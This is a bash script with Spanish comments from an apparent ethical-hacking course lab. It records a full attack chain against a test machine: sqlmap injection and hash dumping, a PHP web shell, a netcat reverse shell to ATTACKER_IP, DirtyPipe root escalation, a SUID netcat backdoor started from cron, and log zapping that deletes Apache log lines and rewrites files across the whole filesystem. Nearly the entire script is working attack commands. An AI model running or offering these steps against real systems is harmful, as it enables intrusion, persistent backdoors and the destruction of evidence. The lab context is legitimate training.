#!/bin/bash

# ===============================================
# Actividad 6 - DDLR Pwneable 3: Comandos de Hacking Ético
# Extracción de comandos del documento Actividad 6 - DDLR Pwneable 3.pdf
# ===============================================

# Variables de Configuración (Ajustar según la red local y fechas)
TARGET_IP="192.168.100.19"
ATTACKER_IP="192.168.100.12"
LISTENER_PORT="4444"
PERSISTENCE_PORT="40004"
LOG_DATE="03\/Nov\/2025" # Fecha a limpiar en Apache logs (usar formato sed)
SQLMAP_REQUEST_FILE="login_request.txt"
DIRTYPIPE_SUID_TARGET="/usr/bin/newgrp" # Binario SUID a atacar con DirtyPipe

## 1. Explotación del Panel FuelFlow (SQL Injection)
echo "--- 1. Explotación SQL Injection con SQLMAP ---"

# Nota: El archivo login_request.txt debe contener el header de la petición POST del login.

# 1.1. Descubrir bases de datos
sqlmap -r $SQLMAP_REQUEST_FILE -p email --dbs --batch --threads=10

# 1.2. Listar tablas de la DB 'petrol'
sqlmap -r $SQLMAP_REQUEST_FILE -p email -D petrol --tables --batch

# 1.3. Listar columnas de la tabla 'login'
sqlmap -r $SQLMAP_REQUEST_FILE -p email -D petrol -T login --columns --batch

# 1.4. Extraer datos (email: pwning@diosdelared.com, hash: b5e534...)
sqlmap -r $SQLMAP_REQUEST_FILE -p email -D petrol -T login --dump --batch

# 1.5. Crackear el hash encontrado (Contraseña: 00qwertyuiop)
# Ejecutar el script crack.sh con el hash y el salt:
# ./crack.sh /path/to/wordlists/rockyou.txt 
# (Requiere el script crack.sh con la lógica de doble SHA-256 y salt fija)

# 1.6. Acceso con Bypass SQLi (usar en campo Email)
# ' OR 1=1 ---

## 2. Shell Upload y Reverse Shell
echo -e "\n--- 2. Shell Upload y Obtención de Reverse Shell ---"

# 2.1. Comando para subir la minishell.php (modificando 'accept' en el navegador):
# La minishell subida a: /fuelflow/assets/images/mini-shell.php
# Contenido de la minishell: <?php $r=system($_GET["c"]); echo $r; echo "<form> <input type=hidden name=page value='/tmp/shell.php'><input type=text name=c><input type=submit></form>"; ?>

# 2.2. Configurar listener en la máquina del atacante (Host)
nc -lvnp $LISTENER_PORT

# 2.3. Ejecutar reverse shell desde la shell web (sustituir $ATTACKER_IP):
# URL: http://$TARGET_IP/fuelflow/assets/images/mini-shell.php?c=$(which%20nc)%20-e/bin/bash%20$ATTACKER_IP%20$LISTENER_PORT
# Comando de inyección:
# $(which nc) -e/bin/bash $ATTACKER_IP $LISTENER_PORT

# 2.4. Mejorar la shell después de la conexión:
script /dev/null -c bash
export TERM=xterm
export SHELL=bash
# suspender la terminal ctrl+z, luego:
stty raw -echo; fg
reset

# 2.5. Búsqueda de contraseñas de configuración (en el web root)
find /var/www/html/ -type f \( -name "*.php" -o -name "*.txt" \) -print 2>/dev/null | xargs -I {} sh -c 'grep -HnF "password" "{}" 2>/dev/null'

## 3. Escalada de Privilegios (Dirty Pipe - CVE-2022-0847)
echo -e "\n--- 3. Escalada de Privilegios con Dirty Pipe ---"

# 3.1. Buscar binarios SUID (para verificar y seleccionar el objetivo)
find / -type f -perm -4000 2>/dev/null

# 3.2. Explotar un binario SUID (ej. /usr/bin/newgrp) con el exploit 'dirty' o 'pwn'
# La ejecución del exploit genera la shell root en /tmp/sh
./pwn $DIRTYPIPE_SUID_TARGET
# O
./dirty $DIRTYPIPE_SUID_TARGET

# 3.3. Obtener la shell de root creada por DirtyPipe
# /tmp/sh
# Comando para suplantar identidad (si se usó el exploit de sobreescritura de /etc/passwd con 'shur3'):
# su shur3
# Password: 1234

# 3.4. Obtener la flag de root:
# cat /root/flag.txt

## 4. Persistencia (Como root)
echo -e "\n--- 4. Persistencia (SUID Shell en Cron) ---"

# 4.1. Mover el shell de root creado por DirtyPipe a una ubicación persistente
# mv /tmp/sh /usr/bin/alvlgeddl

# 4.2. Crear el script de listener SUID en /usr/bin/ncc (Contenido en el PDF)
# #!/bin/bash
# SHELL_PATH="/usr/bin/alvlgeddl"
# PORT="$PERSISTENCE_PORT"
# iniciar_listener() { while true; do /usr/bin/nc -l -p "$PORT" -e "$SHELL_PATH"; sleep 5; done }
# iniciar_listener &

# 4.3. Asignar permisos SUID al shell y al script
chmod 4755 /usr/bin/ncc
chmod 4755 /usr/bin/alvlgeddl

# 4.4. Agregar la tarea cron (usar 'crontab -e')
# Ejecuta el listener cada minuto, redirigiendo la salida a /dev/null
crontab -e
# Agregar la línea:
# */1 * * * * /usr/bin/ncc > /dev/null 2>&1

# 4.5. Comando para probar la persistencia
# nc $TARGET_IP $PERSISTENCE_PORT

## 5. Log Zapping (Limpieza de Vestigios)
echo -e "\n--- 5. Log Zapping (Limpieza Final) ---"

# 5.1. Restaurar el archivo /etc/passwd si fue modificado con el segundo exploit (DirtyPipe de /etc/passwd)
# Nota: La ruta de 'passwd' es relativa al directorio de ejecución (donde estaba el exploit).
cp /var/www/html/fuelflow/assets/images/passwd /etc/passwd

# 5.2. Eliminar scripts y binarios del exploit (mini-shell.php, dirty, pwn, pwn.c, dirty.c, etc.)
find /var/www/html/fuelflow/assets/images -type f ! \( -name "*.jpg" -o -name "*.png" -o -name "*.gif" \) -print | xargs -0 rm

# 5.3. Sanear la IP del atacante ($ATTACKER_IP) reemplazándola por 0.0.0.0 en todos los archivos
find / -type f -exec sed -i "s/$ATTACKER_IP/0.0.0.0/g" {} + 2>/dev/null

# 5.4. Eliminar líneas del log de Apache por fecha (elimina todas las líneas con la fecha especificada)
# El PDF usa '03/Nov/2025'
sed -i "/$LOG_DATE/d" /var/log/apache2/access.log

# 5.5. Limpiar el historial de root
# Se debe hacer manualmente o forzando la eliminación (truncate)
# truncate -s 0 /root/.bash_history
